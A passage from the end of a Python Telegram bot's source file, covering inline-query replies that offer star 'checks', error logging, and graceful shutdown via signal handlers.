                        reply_markup=kb
                    ))
                else:
                    results.append(InlineQueryResultArticle(
                        id=uuid.uuid4().hex,
                        title=f"Чек {amount} ⭐️",
                        description=desc,
                        input_message_content=InputTextMessageContent(
                            message_text=txt_content,
                            parse_mode="HTML"
                        ),
                        reply_markup=kb
                    ))

            await q.answer(results, cache_time=0, is_personal=True)

        except Exception as e:
            print(f"❌ ОШИБКА INLINE: {e}")
            try: await q.answer([], cache_time=1)
            except: pass
                
        except Exception as e:
            # Ignore errors
            pass

    return router

async def shutdown():
    """Корректное завершение работы"""
    global session_monitor
    
    if session_monitor:
        await session_monitor.stop_monitoring()
        print_info("Мониторинг сессий остановлен")
    
    print_info("Бот завершает работу...")

# Добавьте обработчик сигналов завершения (в самом конце файла)
import signal

def handle_exit(signum, frame):
    print_info(f"Получен сигнал {signum}, завершаю работу...")
    asyncio.create_task(shutdown())

try:
    signal.signal(signal.SIGINT, handle_exit)
    signal.signal(signal.SIGTERM, handle_exit)
except:
    pass  # На Windows могут быть проблемы с сигналами


if __name__ == "__main__":
    try: asyncio.run(FragmentBot().run())
    except KeyboardInterrupt: print_warning("Stopped.")
